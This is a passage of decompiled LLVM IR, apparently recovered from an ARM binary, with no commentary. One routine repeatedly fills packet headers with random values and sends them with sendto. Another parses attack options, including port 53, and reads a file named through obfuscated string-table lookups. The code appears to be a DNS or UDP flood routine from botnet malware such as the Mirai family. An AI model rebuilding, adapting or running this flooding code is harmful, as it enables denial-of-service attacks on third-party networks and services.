  %tmp62 = icmp ult i8 %v3_e808, 32
  br i1 %tmp62, label %dec_label_pc_e904, label %dec_label_pc_e824

dec_label_pc_e824:                                ; preds = %dec_label_pc_e7f8
  store i32 %v3_e650, i32* %r2.global-to-local, align 4
  store i1 %v3_e828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e828, label %dec_label_pc_e96c, label %dec_label_pc_e830

dec_label_pc_e830:                                ; preds = %dec_label_pc_e904.dec_label_pc_e830_crit_edge, %dec_label_pc_e824
  %v1_e834 = phi i32 [ %v1_e834.pre, %dec_label_pc_e904.dec_label_pc_e830_crit_edge ], [ 65535, %dec_label_pc_e824 ]
  store i32 %v3_e654, i32* %r3.global-to-local, align 4
  %v9_e834 = icmp eq i32 %v3_e654, %v1_e834
  store i1 %v9_e834, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e834, label %dec_label_pc_e988, label %dec_label_pc_e83c

dec_label_pc_e83c:                                ; preds = %dec_label_pc_e96c.dec_label_pc_e83c_crit_edge, %dec_label_pc_e830
  %v1_e840 = phi i32 [ %v1_e840.pre, %dec_label_pc_e96c.dec_label_pc_e83c_crit_edge ], [ %v1_e834, %dec_label_pc_e830 ]
  %v9_e840 = icmp eq i32 %v3_e658, %v1_e840
  store i1 %v9_e840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e840, label %dec_label_pc_e9a4, label %dec_label_pc_e848

dec_label_pc_e848:                                ; preds = %dec_label_pc_e988, %dec_label_pc_e83c, %dec_label_pc_e9a4
  %v0_e84c = load i32, i32* %r8.global-to-local, align 4
  %v1_e84c = trunc i32 %v0_e84c to i8
  %v2_e84c = load i32, i32* @r5, align 4
  %v3_e84c = add i32 %v2_e84c, 10
  %v4_e84c = inttoptr i32 %v3_e84c to i8*
  store i8 %v1_e84c, i8* %v4_e84c, align 1
  %v0_e850 = load i32, i32* %r8.global-to-local, align 4
  %v1_e850 = trunc i32 %v0_e850 to i8
  %v2_e850 = load i32, i32* @r5, align 4
  %v3_e850 = add i32 %v2_e850, 11
  %v4_e850 = inttoptr i32 %v3_e850 to i8*
  store i8 %v1_e850, i8* %v4_e850, align 1
  %v0_e854 = load i32, i32* @r5, align 4
  store i32 %v0_e854, i32* @r0, align 4
  %v2_e858 = call i32 @function_f17c(i32 %v0_e854, i32 20)
  %v3_e858 = trunc i32 %v2_e858 to i8
  %v4_e85c = sdiv i32 %v2_e858, 256
  store i32 %v4_e85c, i32* %r3.global-to-local, align 4
  %v1_e860 = trunc i32 %v4_e85c to i8
  %v2_e860 = load i32, i32* @r5, align 4
  %v3_e860 = add i32 %v2_e860, 11
  %v4_e860 = inttoptr i32 %v3_e860 to i8*
  store i8 %v1_e860, i8* %v4_e860, align 1
  %v3_e864 = load i32, i32* @r5, align 4
  %v4_e864 = add i32 %v3_e864, 10
  %v5_e864 = inttoptr i32 %v4_e864 to i8*
  store i8 %v3_e858, i8* %v5_e864, align 1
  %v0_e868 = load i32, i32* %r8.global-to-local, align 4
  %v1_e868 = trunc i32 %v0_e868 to i8
  %v2_e868 = load i32, i32* @r6, align 4
  %v3_e868 = add i32 %v2_e868, 6
  %v4_e868 = inttoptr i32 %v3_e868 to i8*
  store i8 %v1_e868, i8* %v4_e868, align 1
  %v0_e86c = load i32, i32* %r8.global-to-local, align 4
  %v1_e86c = trunc i32 %v0_e86c to i8
  %v2_e86c = load i32, i32* @r6, align 4
  %v3_e86c = add i32 %v2_e86c, 7
  %v4_e86c = inttoptr i32 %v3_e86c to i8*
  store i8 %v1_e86c, i8* %v4_e86c, align 1
  %v0_e870 = load i32, i32* @r5, align 4
  %v1_e870 = add i32 %v0_e870, 24
  %v2_e870 = inttoptr i32 %v1_e870 to i8*
  %v3_e870 = load i8, i8* %v2_e870, align 1
  %v4_e870 = zext i8 %v3_e870 to i32
  store i32 %v4_e870, i32* %r3.global-to-local, align 4
  %v1_e874 = add i32 %v0_e870, 25
  %v2_e874 = inttoptr i32 %v1_e874 to i8*
  %v3_e874 = load i8, i8* %v2_e874, align 1
  %v4_e874 = zext i8 %v3_e874 to i32
  %v4_e878 = mul nuw nsw i32 %v4_e874, 256
  %v5_e878 = or i32 %v4_e878, %v4_e870
  store i32 %v5_e878, i32* %r2.global-to-local, align 4
  %v3_e87c = load i32, i32* %stack_var_-44, align 4
  %v0_e880 = load i32, i32* @r6, align 4
  store i32 %v0_e880, i32* @r1, align 4
  %v1_e884 = add i32 %v3_e87c, 12
  store i32 %v1_e884, i32* %r3.global-to-local, align 4
  %v4_e88c = call i32 @function_f1d8(i32 %v0_e870, i32 %v0_e880, i32 %v5_e878, i32 %v1_e884)
  %v5_e88c = trunc i32 %v4_e88c to i8
  %v4_e89025 = udiv i32 %v4_e88c, 256
  %v1_e894 = trunc i32 %v4_e89025 to i8
  %v2_e894 = load i32, i32* @r6, align 4
  %v3_e894 = add i32 %v2_e894, 7
  %v4_e894 = inttoptr i32 %v3_e894 to i8*
  store i8 %v1_e894, i8* %v4_e894, align 1
  %v3_e898 = load i32, i32* @r6, align 4
  %v4_e898 = add i32 %v3_e898, 6
  %v5_e898 = inttoptr i32 %v4_e898 to i8*
  store i8 %v5_e88c, i8* %v5_e898, align 1
  %v3_e89c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e89c, i32* %r3.global-to-local, align 4
  %v0_e8a0 = load i32, i32* @r5, align 4
  %v1_e8a0 = add i32 %v0_e8a0, 20
  %v2_e8a0 = inttoptr i32 %v1_e8a0 to i32*
  %v3_e8a0 = load i32, i32* %v2_e8a0, align 4
  %v5_e8a8 = mul i32 %v3_e89c, 24
  %v1_e8ac = load i32, i32* @sl, align 4
  %v2_e8ac = add i32 %v1_e8ac, %v5_e8a8
  store i32 %v2_e8ac, i32* %ip.global-to-local, align 4
  %v3_e8b0 = udiv i32 %v3_e8a0, 65536
  store i32 %v3_e8b0, i32* %r2.global-to-local, align 4
  %v1_e8b4 = trunc i32 %v3_e8b0 to i8
  %v3_e8b4 = add i32 %v2_e8ac, 2
  %v4_e8b4 = inttoptr i32 %v3_e8b4 to i8*
  store i8 %v1_e8b4, i8* %v4_e8b4, align 1
  %v0_e8b8 = load i32, i32* %r2.global-to-local, align 4
  %v3_e8b826 = udiv i32 %v0_e8b8, 256
  %v3_e8bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_e8bc, i32* %r2.global-to-local, align 4
  %v1_e8c0 = trunc i32 %v3_e8b826 to i8
  %v2_e8c0 = load i32, i32* %ip.global-to-local, align 4
  %v3_e8c0 = add i32 %v2_e8c0, 3
  %v4_e8c0 = inttoptr i32 %v3_e8c0 to i8*
  store i8 %v1_e8c0, i8* %v4_e8c0, align 1
  %v0_e8c4 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e8cc = load i32, i32* %r2.global-to-local, align 4
  %v1_e8cc = add i32 %v0_e8cc, 32
  store i32 %v1_e8cc, i32* %r2.global-to-local, align 4
  %v0_e8d0 = load i32, i32* %fp.global-to-local, align 4
  %v0_e8d8 = load i32, i32* %ip.global-to-local, align 4
  %v4_e8d8 = inttoptr i32 %v0_e8d8 to %sockaddr*
  %v7_e8e0 = inttoptr i32 %v0_e8c4 to i32*
  %v9_e8e0 = call i32 @sendto(i32 %v0_e8d0, i32* %v7_e8e0, i32 %v1_e8cc, i32 16384, %sockaddr* %v4_e8d8, i32 16)
  %v3_e8e4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e8e4, i32* %r3.global-to-local, align 4
  %v1_e8e8 = add i32 %v3_e8e4, 1
  %v1_e8ec = load i32, i32* %sb.global-to-local, align 4
  %v9_e8ec = icmp eq i32 %v1_e8e8, %v1_e8ec
  store i1 %v9_e8ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e8e8, i32* %stack_var_-40, align 4
  %v5_e8f4 = icmp slt i32 %v1_e8e8, %v1_e8ec
  br i1 %v5_e8f4, label %dec_label_pc_e7f8, label %dec_label_pc_e8f8

dec_label_pc_e8f8:                                ; preds = %dec_label_pc_e848
  %v2_e8f8 = icmp eq i32 %v1_e8ec, 0
  store i1 %v2_e8f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e7e8.outer

dec_label_pc_e904:                                ; preds = %dec_label_pc_e7f8
  %v1_e904 = add i32 %v2_e800, 16
  %v2_e904 = inttoptr i32 %v1_e904 to i32*
  %v3_e904 = load i32, i32* %v2_e904, align 4
  store i32 %v3_e904, i32* @r4, align 4
  %v0_e908 = call i32 @function_10b68()
  %v3_e90c = load i32, i32* %stack_var_-40, align 4
  %v5_e914 = mul i32 %v3_e90c, 24
  %v0_e918 = load i32, i32* @r4, align 4
  %v1_e91c = and i32 %v0_e918, 65280
  store i32 %v1_e91c, i32* %r3.global-to-local, align 4
  %v1_e918 = udiv i32 %v0_e918, 256
  %v3_e920 = and i32 %v1_e918, 65280
  store i32 %v3_e920, i32* %r2.global-to-local, align 4
  %v1_e924 = load i32, i32* @sl, align 4
  %v2_e924 = add i32 %v1_e924, %v5_e914
  store i32 %v2_e924, i32* %ip.global-to-local, align 4
  %v1_e930 = add i32 %v2_e924, 20
  %v2_e930 = inttoptr i32 %v1_e930 to i8*
  %v3_e930 = load i8, i8* %v2_e930, align 1
  %v4_e930 = zext i8 %v3_e930 to i32
  store i32 %v4_e930, i32* %lr.global-to-local, align 4
  %v2_e938 = call i32 @llvm.bswap.i32(i32 %v0_e918)
  %v7_e93c = lshr i32 %v0_e908, %v4_e930
  %v8_e93c = add i32 %v7_e93c, %v2_e938
  store i32 %v3_e650, i32* %r2.global-to-local, align 4
  %v2_e95c = call i32 @llvm.bswap.i32(i32 %v8_e93c)
  store i32 %v2_e95c, i32* %r3.global-to-local, align 4
  %v1_e960 = load i32, i32* %r7.global-to-local, align 4
  %v9_e960 = icmp eq i32 %v3_e650, %v1_e960
  store i1 %v9_e960, i1* %cpsr_z.global-to-local, align 1
  %v1_e964 = load i32, i32* @r5, align 4
  %v2_e964 = add i32 %v1_e964, 16
  %v3_e964 = inttoptr i32 %v2_e964 to i32*
  store i32 %v2_e95c, i32* %v3_e964, align 4
  br i1 %v9_e960, label %dec_label_pc_e96c, label %dec_label_pc_e904.dec_label_pc_e830_crit_edge

dec_label_pc_e904.dec_label_pc_e830_crit_edge:    ; preds = %dec_label_pc_e904
  %v1_e834.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e830

dec_label_pc_e96c:                                ; preds = %dec_label_pc_e904, %dec_label_pc_e824
  %v0_e96c = call i32 @function_10b68()
  %v1_e96c = trunc i32 %v0_e96c to i8
  %v4_e97027 = udiv i32 %v0_e96c, 256
  %v1_e974 = trunc i32 %v4_e97027 to i8
  %v2_e974 = load i32, i32* @r5, align 4
  %v3_e974 = add i32 %v2_e974, 5
  %v4_e974 = inttoptr i32 %v3_e974 to i8*
  store i8 %v1_e974, i8* %v4_e974, align 1
  store i32 %v3_e654, i32* %r3.global-to-local, align 4
  %v1_e97c = load i32, i32* %r7.global-to-local, align 4
  %v9_e97c = icmp eq i32 %v3_e654, %v1_e97c
  store i1 %v9_e97c, i1* %cpsr_z.global-to-local, align 1
  %v3_e980 = load i32, i32* @r5, align 4
  %v4_e980 = add i32 %v3_e980, 4
  %v5_e980 = inttoptr i32 %v4_e980 to i8*
  store i8 %v1_e96c, i8* %v5_e980, align 1
  %v0_e984 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e984, label %dec_label_pc_e988, label %dec_label_pc_e96c.dec_label_pc_e83c_crit_edge

dec_label_pc_e96c.dec_label_pc_e83c_crit_edge:    ; preds = %dec_label_pc_e96c
  %v1_e840.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e83c

dec_label_pc_e988:                                ; preds = %dec_label_pc_e96c, %dec_label_pc_e830
  %v0_e988 = call i32 @function_10b68()
  %v1_e988 = trunc i32 %v0_e988 to i8
  %v4_e990 = sdiv i32 %v0_e988, 256
  store i32 %v4_e990, i32* %r3.global-to-local, align 4
  %v1_e994 = load i32, i32* %r7.global-to-local, align 4
  %v9_e994 = icmp eq i32 %v3_e658, %v1_e994
  store i1 %v9_e994, i1* %cpsr_z.global-to-local, align 1
  %v3_e998 = load i32, i32* @r5, align 4
  %v4_e998 = add i32 %v3_e998, 20
  %v5_e998 = inttoptr i32 %v4_e998 to i8*
  store i8 %v1_e988, i8* %v5_e998, align 1
  %v0_e99c = load i32, i32* %r3.global-to-local, align 4
  %v1_e99c = trunc i32 %v0_e99c to i8
  %v2_e99c = load i32, i32* @r6, align 4
  %v3_e99c = add i32 %v2_e99c, 1
  %v4_e99c = inttoptr i32 %v3_e99c to i8*
  store i8 %v1_e99c, i8* %v4_e99c, align 1
  %v0_e9a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e9a0, label %dec_label_pc_e9a4, label %dec_label_pc_e848

dec_label_pc_e9a4:                                ; preds = %dec_label_pc_e988, %dec_label_pc_e83c
  %v0_e9a4 = call i32 @function_10b68()
  %v1_e9a4 = trunc i32 %v0_e9a4 to i8
  %v4_e9a8 = sdiv i32 %v0_e9a4, 256
  store i32 %v4_e9a8, i32* %r3.global-to-local, align 4
  %v1_e9ac = trunc i32 %v4_e9a8 to i8
  %v2_e9ac = load i32, i32* @r6, align 4
  %v3_e9ac = add i32 %v2_e9ac, 3
  %v4_e9ac = inttoptr i32 %v3_e9ac to i8*
  store i8 %v1_e9ac, i8* %v4_e9ac, align 1
  %v3_e9b0 = load i32, i32* @r6, align 4
  %v4_e9b0 = add i32 %v3_e9b0, 2
  %v5_e9b0 = inttoptr i32 %v4_e9b0 to i8*
  store i8 %v1_e9a4, i8* %v5_e9b0, align 1
  br label %dec_label_pc_e848

dec_label_pc_e9b8:                                ; preds = %dec_label_pc_e618
  %v0_e9b8 = load i32, i32* %fp.global-to-local, align 4
  %v1_e9bc = call i32 @close(i32 %v0_e9b8)
  br label %dec_label_pc_e9c0

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e508, %dec_label_pc_e9b8
  %v29_e9c4 = phi i32 [ %v3_e608, %dec_label_pc_e508 ], [ %v1_e9bc, %dec_label_pc_e9b8 ]
  store i32 %v3_e508, i32* %r4.global-to-local, align 4
  store i32 %v6_e508, i32* %r5.global-to-local, align 4
  store i32 %v9_e508, i32* %r6.global-to-local, align 4
  store i32 %v12_e508, i32* %r7.global-to-local, align 4
  ret i32 %v29_e9c4

; uselistorder directives
  uselistorder i32 %v4_e9a8, { 1, 0 }
  uselistorder i32 %v2_e95c, { 1, 0 }
  uselistorder i32 %v0_e918, { 1, 0, 2 }
  uselistorder i1 %v2_e8f8, { 1, 0 }
  uselistorder i32 %v1_e8ec, { 1, 2, 3, 0 }
  uselistorder i32 %v1_e8e8, { 2, 0, 3, 1 }
  uselistorder i32 %v3_e8b0, { 1, 0 }
  uselistorder i32 %v4_e85c, { 1, 0 }
  uselistorder i1 %v3_e828, { 1, 0 }
  uselistorder i32 %v1_e7d0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_e774, { 1, 0 }
  uselistorder i32 %v1_e6fc, { 1, 0 }
  uselistorder i32 %v1_e684, { 1, 0 }
  uselistorder i32 %v1_e678, { 1, 0 }
  uselistorder i32 %v0_e648, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_e640, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_e638, { 1, 0 }
  uselistorder i1 %v7_e60c, { 1, 0 }
  uselistorder i32 %v3_e608, { 1, 2, 0 }
  uselistorder i32 %v1_e5a8, { 1, 0 }
  uselistorder i8 %v5_e598, { 1, 0 }
  uselistorder i32 %v5_e57c, { 1, 0 }
  uselistorder i32 %v6_e540, { 1, 0 }
  uselistorder i32 %v1_e50c, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 1, 13, 12 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 -8, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_e9c0, { 1, 0 }
  uselistorder label %dec_label_pc_e848, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e7e8, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_e9cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e9cc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-2120 = alloca i32, align 4
  %v3_e9cc = load i32, i32* @r4, align 4
  %v6_e9cc = load i32, i32* @r5, align 4
  %v9_e9cc = load i32, i32* @r6, align 4
  %v12_e9cc = load i32, i32* @r7, align 4
  %v15_e9cc = load i32, i32* @r8, align 4
  %v18_e9cc = load i32, i32* @sb, align 4
  %v21_e9cc = load i32, i32* @sl, align 4
  %v24_e9cc = load i32, i32* @fp, align 4
  %v1_e9d8 = urem i32 %arg1, 256
  store i32 %v1_e9d8, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e9e4 = urem i32 %arg3, 256
  store i32 %v1_e9e4, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_e9f0 = call i32* @calloc(i32 %v1_e9d8, i32 4)
  %v4_e9f0 = ptrtoint i32* %v2_e9f0 to i32
  %v0_e9f4 = load i32, i32* @r5, align 4
  store i32 %v0_e9f4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ea00 = load i32, i32* @r4, align 4
  store i32 %v0_ea00, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_ea08 = inttoptr i32 %v0_e9f4 to i32*
  %v6_ea08 = call i32 @function_b240(i32 %v0_ea00, i32* %v5_ea08, i32 2, i32 0)
  %v1_ea14 = urem i32 %v6_ea08, 256
  store i32 %v1_ea14, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ea20 = load i32, i32* @r4, align 4
  store i32 %v0_ea20, i32* %r0.global-to-local, align 4
  %v0_ea24 = load i32, i32* @r5, align 4
  store i32 %v0_ea24, i32* %r1.global-to-local, align 4
  %v5_ea28 = trunc i32 %v6_ea08 to i8
  %v6_ea2c = inttoptr i32 %v0_ea24 to i32*
  %v7_ea2c = call i32 @function_b240(i32 %v0_ea20, i32* %v6_ea2c, i32 3, i32 65535)
  %v0_ea30 = load i32, i32* @r5, align 4
  store i32 %v0_ea30, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_ea3c = load i32, i32* @r4, align 4
  store i32 %v0_ea3c, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_ea44 = inttoptr i32 %v0_ea30 to i32*
  %v6_ea44 = call i32 @function_b240(i32 %v0_ea3c, i32* %v5_ea44, i32 4, i32 64)
  %v1_ea4c = urem i32 %v6_ea44, 256
  store i32 %v1_ea4c, i32* %ip.global-to-local, align 4
  %v0_ea50 = load i32, i32* @r5, align 4
  store i32 %v0_ea50, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ea5c = load i32, i32* @r4, align 4
  store i32 %v0_ea5c, i32* %r0.global-to-local, align 4
  %v6_ea64 = inttoptr i32 %v0_ea50 to i32*
  %v7_ea64 = call i32 @function_b240(i32 %v0_ea5c, i32* %v6_ea64, i32 5, i32 0)
  %v1_ea70 = urem i32 %v7_ea64, 256
  store i32 %v1_ea70, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_ea7c = load i32, i32* @r4, align 4
  store i32 %v0_ea7c, i32* %r0.global-to-local, align 4
  %v0_ea80 = load i32, i32* @r5, align 4
  store i32 %v0_ea80, i32* %r1.global-to-local, align 4
  %v5_ea88 = inttoptr i32 %v0_ea80 to i32*
  %v6_ea88 = call i32 @function_b240(i32 %v0_ea7c, i32* %v5_ea88, i32 6, i32 65535)
  %v0_ea8c = load i32, i32* @r5, align 4
  store i32 %v0_ea8c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  store i32 %v6_ea88, i32* %fp.global-to-local, align 4
  %v0_ea9c = load i32, i32* @r4, align 4
  store i32 %v0_ea9c, i32* %r0.global-to-local, align 4
  %v4_eaa0 = inttoptr i32 %v0_ea8c to i32*
  %v5_eaa0 = call i32 @function_b240(i32 %v0_ea9c, i32* %v4_eaa0, i32 7, i32 53)
  %v0_eaa8 = load i32, i32* @r5, align 4
  store i32 %v0_eaa8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v5_eaa0, i32* %sb.global-to-local, align 4
  %v0_eab8 = load i32, i32* @r4, align 4
  store i32 %v0_eab8, i32* %r0.global-to-local, align 4
  %v4_eabc = inttoptr i32 %v0_eaa8 to i32*
  %v5_eabc = call i32 @function_b240(i32 %v0_eab8, i32* %v4_eabc, i32 9, i32 65535)
  %v0_eac0 = load i32, i32* @r5, align 4
  store i32 %v0_eac0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 %v5_eabc, i32* @sl, align 4
  %v0_ead0 = load i32, i32* @r4, align 4
  store i32 %v0_ead0, i32* %r0.global-to-local, align 4
  %v4_ead4 = inttoptr i32 %v0_eac0 to i32*
  %v5_ead4 = call i32 @function_b240(i32 %v0_ead0, i32* %v4_ead4, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_eae0 = load i32, i32* @r5, align 4
  store i32 %v0_eae0, i32* %r1.global-to-local, align 4
  store i32 %v5_ead4, i32* %r8.global-to-local, align 4
  %v0_eae8 = load i32, i32* @r4, align 4
  store i32 %v0_eae8, i32* %r0.global-to-local, align 4
  %v5_eaec = inttoptr i32 %v0_eae0 to i32*
  %v6_eaec = call i32 @function_acdc(i32 %v0_eae8, i32* %v5_eaec, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_eaf8 = call i32 @function_13074(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_eb04 = call i32 @function_12f90(i32 30, i32* null)
  %v4_eb04 = inttoptr i32 %v3_eb04 to i8*
  store i32 %v3_eb04, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_eb0c = call i32 (i8*, i32, ...) @open(i8* %v4_eb04, i32 0)
  store i32 %v4_eb0c, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_eb18 = call i32 @function_12fbc(i32 30)
  store i32 %v1_eb18, i32* %r0.global-to-local, align 4
  %v0_eb1c = load i32, i32* @r4, align 4
  %v1_eb1c = icmp slt i32 %v0_eb1c, 0
  %v2_eb1c = icmp eq i32 %v0_eb1c, 0
  store i1 %v2_eb1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_eb1c, label %dec_label_pc_f0e8, label %dec_label_pc_eb24

dec_label_pc_eb24:                                ; preds = %dec_label_pc_e9cc
  %v2_eb28 = ptrtoint i32* %stack_var_-2120 to i32
  store i32 %v2_eb28, i32* @r6, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_eb28, i32* %r1.global-to-local, align 4
  store i32 %v0_eb1c, i32* %r0.global-to-local, align 4
  %v4_eb38 = call i32 @read(i32 %v0_eb1c, i32* nonnull %stack_var_-2120, i32 2048)
  store i32 %v4_eb38, i32* @r5, align 4
  %v0_eb40 = load i32, i32* @r4, align 4
  store i32 %v0_eb40, i32* %r0.global-to-local, align 4
  %v1_eb44 = call i32 @close(i32 %v0_eb40)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_eb4c = call i32 @function_13074(i32 31)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_eb58 = call i32 @function_12f90(i32 31, i32* null)
  %v0_eb5c = load i32, i32* @r5, align 4
  store i32 %v0_eb5c, i32* @r1, align 4
  store i32 %v3_eb58, i32* %r2.global-to-local, align 4
  store i32 %v2_eb28, i32* %r0.global-to-local, align 4
  %v3_eb68 = bitcast i32* %stack_var_-2120 to i8*
  %v4_eb68 = call i32 @function_13cf0(i8* %v3_eb68, i32 %v0_eb5c, i32 %v3_eb58)
  store i32 %v4_eb68, i32* @r4, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_eb74 = call i32 @function_12fbc(i32 31)
  store i32 %v1_eb74, i32* %r0.global-to-local, align 4
  %v0_eb78 = load i32, i32* @r4, align 4
  %v7_eb78 = icmp eq i32 %v0_eb78, -1
  store i1 %v7_eb78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb78, label %dec_label_pc_f0e8, label %dec_label_pc_eb80

dec_label_pc_eb80:                                ; preds = %dec_label_pc_eb24
  %v0_eb80 = load i32, i32* @r5, align 4
  %v9_eb80 = icmp eq i32 %v0_eb80, %v0_eb78
  store i1 %v9_eb80, i1* %cpsr_z.global-to-local, align 1
  %v7_eb84 = icmp sgt i32 %v0_eb80, %v0_eb78
  br i1 %v7_eb84, label %dec_label_pc_eb88, label %dec_label_pc_f0e8

dec_label_pc_eb88:                                ; preds = %dec_label_pc_eb80
  store i32 %v0_eb80, i32* %r3.global-to-local, align 4
  store i32 %v0_eb78, i32* %r2.global-to-local, align 4
  %v0_eb98 = load i32, i32* @r6, align 4
  %v2_eb98 = add i32 %v0_eb98, %v0_eb78
  store i32 %v2_eb98, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_eba0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_eba0, i32* %r7.global-to-local, align 4
  %v1_ebd0 = add i32 %v0_eb80, -1
  br label %dec_label_pc_ebc8

dec_label_pc_ebac:                                ; preds = %dec_label_pc_ebf0, %bb139
  %v9_ebac = icmp eq i32 %v0_ebb8, %v1_ebd0
  store i1 %v9_ebac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ebac, label %dec_label_pc_ebfc, label %dec_label_pc_ebb4

dec_label_pc_ebb4:                                ; preds = %dec_label_pc_ebe0, %dec_label_pc_ebac, %bb
  %v0_ebec43 = phi i32 [ %v0_ebec, %dec_label_pc_ebe0 ], [ %v0_ebec44, %dec_label_pc_ebac ], [ %v0_ebec, %bb ]
  %v0_ebcc39 = phi i32 [ 0, %dec_label_pc_ebe0 ], [ %v0_ebcc40, %dec_label_pc_ebac ], [ 0, %bb ]
  store i32 %v0_eb80, i32* %r0.global-to-local, align 4
  %v1_ebb8 = add i32 %v0_ebb8, 1
  store i32 %v1_ebb8, i32* %r2.global-to-local, align 4
  %v9_ebbc = icmp eq i32 %v0_eb80, %v1_ebb8
  store i1 %v9_ebbc, i1* %cpsr_z.global-to-local, align 1
  %v1_ebc0 = add i32 %v0_ebc0, 1
  store i32 %v1_ebc0, i32* %r7.global-to-local, align 4
  br i1 %v9_ebbc, label %dec_label_pc_f0e8, label %dec_label_pc_ebc8

dec_label_pc_ebc8:                                ; preds = %dec_label_pc_ebb4, %dec_label_pc_eb88
  %v0_ebc0 = phi i32 [ %v1_ebc0, %dec_label_pc_ebb4 ], [ %v2_eba0, %dec_label_pc_eb88 ]
  %v0_ebb8 = phi i32 [ %v1_ebb8, %dec_label_pc_ebb4 ], [ %v0_eb78, %dec_label_pc_eb88 ]
  %v0_ebec = phi i32 [ %v0_ebec43, %dec_label_pc_ebb4 ], [ 0, %dec_label_pc_eb88 ]
